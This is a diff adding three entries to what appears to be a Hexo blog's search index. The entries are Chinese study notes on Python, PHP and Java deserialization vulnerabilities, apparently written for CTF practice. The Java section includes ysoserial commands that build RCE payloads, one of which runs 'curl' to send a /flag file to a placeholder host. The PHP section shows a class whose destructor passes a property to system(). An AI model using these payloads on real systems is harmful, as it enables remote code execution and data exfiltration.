@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>序列化-python反序列化</title>
+      <link href="/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-python%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
+      <url>/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-python%E5%8F%8D%E5%BA%8F%E5%88%97/</url>
+      
+        <content type="html"><![CDATA[<h1 id="序列化-python反序列化"><a href="#序列化-python反序列化" class="headerlink" title="序列化-python反序列化"></a>序列化-python反序列化</h1><p>1、Python反序列化函数使用<br>2、Python反序列化魔术方法<br>3、Python反序列化POP构造<br>4、Python自动化代码审计bandit使用</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>pickle dump(obj.file) 将文件序列化后保存在文件<br>pickle load(file)读取文件，将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj)将对象序列化成为字符串格式的字节流<br>pickle.loads(bytes_obj)将字符串格式的字节流反序列化为对象</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><em>reduce</em>()  反序列化时调用<br>_reduce_ex() 反序列化时调用<br><em>setstate</em>() 反序列化时调用<br><em>geststate</em>() 反序列化时调用</p><h2 id="各种函数语言函数"><a href="#各种函数语言函数" class="headerlink" title="各种函数语言函数"></a>各种函数语言函数</h2><p><strong>Java：</strong> Serializable Externalizable 接口、fastjson、jackson、gson、<br>ObjectInputStream.read、ObjectObjectInputStream.readUnshared、<br>XMLDecoder.read、ObjectYaml.loadXStream.fromXML、<br>ObjectMapper.readValue、JSON.parseObject 等<br><strong>PHP：</strong> serialize()、 unserialize()<br><strong>Python：</strong>pickle marshal PyYAML shelve PIL unzip</p><p>BUUCTFt例题坤坤后援团</p><p>前置知识21天jwt</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> python反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>序列化-PHP</title>
+      <link href="/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+      <url>/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+      
+        <content type="html"><![CDATA[<h1 id="序列化-PHP反序列化-amp-POP链构造"><a href="#序列化-PHP反序列化-amp-POP链构造" class="headerlink" title="序列化-PHP反序列化 &amp; POP链构造"></a>序列化-PHP反序列化 &amp; POP链构造</h1><p>啥是反序列化？</p><ul><li>序列化：对象转换为数组或字符串等格式</li><li>反序列化：将数组或字符串等格式转换成对象</li><li>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串</li><li>unserialize() &#x2F;&#x2F;将字符串还原成一个对象</li></ul><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    function __construct()&#123;$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;&#125;</span><br><span class="line">    function happy()&#123;return $this-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="反序列化-魔术方法"><a href="#反序列化-魔术方法" class="headerlink" title="反序列化-魔术方法"></a>反序列化-魔术方法</h2><p>魔术方法：默认会调用的一些方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：</span><br><span class="line">__construct(): //构造函数，当对象 new 的时候会自动调用</span><br><span class="line">__destruct()：//析构函数当对象被销毁时会被自 p(): //unserialize()时会被自动调用</span><br><span class="line">__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用</span><br><span class="line">__call(): //在对象上下文中调用不可访问的方法时触发====》 （在class中调用不存在的方法，会执行call（））</span><br><span class="line">__callStatci(): //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get(): //用于从不可访问的属性读取数据   ====》 （ 访问了方法中不存在的属性，会调用get（）方法）</span><br><span class="line">__set(): //用于将数据写入不可访问的属性   ====》 （将数据写入方法中不存在的属性）</span><br><span class="line">__isset(): //在不可访问的属性上调用 isset()或 empty()触发</span><br><span class="line">__unset(): //在不可访问的属性上使用 unset()时触发</span><br><span class="line">__toString(): //把类当作字符串使用时触发</span><br><span class="line">__sleep(): // 序列化serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span><br><span class="line">——wekeup(): //调用 反序列化 unserialize()函数时，如果存在wakeup()方法，会被调用</span><br></pre></td></tr></table></figure><p>new()新对象后<br>先调用construct()——》在调用destruct()——》</p><p>class C{<br>    public $cmd&#x3D;’ipconfig’;<br>    public function_destruct(){<br>        system($this-&gt;cmd);<br>    }<br>    public function_construct(){<br>        echo ‘start’.’<br>‘;<br>    }<br>}</p><p>&#x2F;&#x2F;函数引用，无对象创建触发魔术 方法自定义变脸<br>unserizlize($GET) &#x2F;&#x2F;URL传入GET<br>&#x2F;&#x2F;接收序列化后的字符串，反序列化成为对象，默认调用方法_destruct()  –&gt;_destruct() 执行</p><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h2 id="PHP反序列化原生类漏洞绕过，公有私有"><a href="#PHP反序列化原生类漏洞绕过，公有私有" class="headerlink" title="PHP反序列化原生类漏洞绕过，公有私有"></a>PHP反序列化原生类漏洞绕过，公有私有</h2><h4 id="方法-amp-属性"><a href="#方法-amp-属性" class="headerlink" title="方法&amp;属性"></a>方法&amp;属性</h4><p>对象变量属性：<br>  public（公共的） 在本类内部、外部类、子类都可以访问<br>  protect（受保护的） 只有本类或子类或父类可以访问<br>  private（私有的） 只有在本类内部可以使用</p><p>序列化后显示：<br>  protect属性序列化的时候格式是%00*%00成员名<br>  private属性序列化的格式是%00类名%00成员名</p><p>class ddd{<br>    public $name &#x3D;”test1”;<br>    private $age &#x3D; “test2”;<br>    protected $sex &#x3D; “man”;<br>}</p><p>序列化以后：</p><pre><code>O:3:&quot;ddd&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;test1&quot;;s:8:&quot;dddage&quot;;s:5:&quot;test2&quot;;s:6:&quot;*sex&quot;;s:3:&quot;man&quot;;&#125;</code></pre><h2 id="反序列化利用大概分三类："><a href="#反序列化利用大概分三类：" class="headerlink" title="反序列化利用大概分三类："></a>反序列化利用大概分三类：</h2><ul><li>魔术方法的调用逻辑，触发条件</li><li>语言原生类的调用-如SoapClient</li><li>语言自身的安全缺陷-CVE-2016-7124</li></ul><p>1、分析逻辑，查找可以利用的魔术方法<br>2、没有方法可用，考虑借助原生类<br>发序列化可以和和xss、scrf结合使用</p><p>CTFshow、buuctf反序列化题目</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PHP反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>序列化-Java反序列化</title>
+      <link href="/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+      <url>/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+      
+        <content type="html"><![CDATA[<h1 id="序列化-Java反序列化"><a href="#序列化-Java反序列化" class="headerlink" title="序列化-Java反序列化"></a>序列化-Java反序列化</h1><p>BUUCTF中有联系题目<br>山羊靶场</p><p>没有源码很难找出漏洞</p><p>序列化：把Java对象转换为字节序列<br>反序列化：字节流恢复为对象</p><p>对象序列化主要有两种用途：<br>把对象的字节序列永久的保存在硬盘上，通常存放在一个文件中（持久化对象）<br>在网络上传送对象的字节序列。（网络传输对象）</p><h3 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h3><p>1、功能特征：<br>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或者DB存储等业务场景<br>所以审计过程中需要重点关注这些功能板块</p><p>2、数据特征：<br>开头<strong>ROoAB</strong>,基本确定是Java序列化base64加密的数据<br>或者<strong>aced</strong>开头，这可能是Java序列化16进制，初始化数据</p><p>工具文件夹中</p><ul><li>可以使用java脚本工具生成16进制bin文件<br>java -jar ysoserial-0.06-SNAPSHOT-all.jar URLDNS “<a href="http://ag61d5.dnslog.cn/">http://ag61d5.dnslog.cn</a>“ &gt; a.bin</li></ul><p>有组件生成 RCE:<br>1、生成：java -Dhibernate5 -cp hibernate-core-<br>5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar<br>ysoserial.GeneratePayload Hibernate1 “calc.exe” &gt; x.bin</p><ul><li>在使用python脚本生成加密后的base64文件</li></ul><p>2、解码：python java.py<br>import base64<br>file &#x3D; open(“x.bin”,”rb”)<br>now &#x3D; file.read()<br>ba &#x3D; base64.b64encode(now)<br>print(ba)<br>file.close()</p><h2 id="解密分析工具-黑盒代码分析会用到"><a href="#解密分析工具-黑盒代码分析会用到" class="headerlink" title="解密分析工具-黑盒代码分析会用到"></a>解密分析工具-黑盒代码分析会用到</h2><p>(数据还原)<br>SerializationDumper-v1,jar</p><p>#解密分析-SerializationDumper 数据分析<br><a href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a><br>java -jar SerializationDumper-v1.13.jar -r urldns.ser &gt;dns.txt</p><p>黑盒观察数据特征<br>白盒：注意组件安全</p><h1 id="生成返序列化payload"><a href="#生成返序列化payload" class="headerlink" title="生成返序列化payload"></a>生成返序列化payload</h1><p>解密后数据中包含账号等信息，通过接口common &#x2F;usr &#x2F;current分析可知数据有接收</p><p>说明存在反序列化操作：</p><h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>将恶意代码进行序列化后，进行后续操作</p><p>利用ysoserial进行序列化生成</p><p>java -jar ysoserical-master-30099844c6-1.jar ROME “curl http:xxxx&#x2F;-d @&#x2F;flag”&gt; flag.bin</p><p>利用py脚本进行反序列化数据提取<br>import base64<br>file &#x3D; open(“flag.bin”.”rb”)<br>now &#x3D; file.read()<br>ba &#x3D; base64.b64encode(now)<br>print(ba)<br>file.close()</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Java反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>漏洞发现</title>
       <link href="/2023/06/06/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
       <url>/2023/06/06/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/</url>
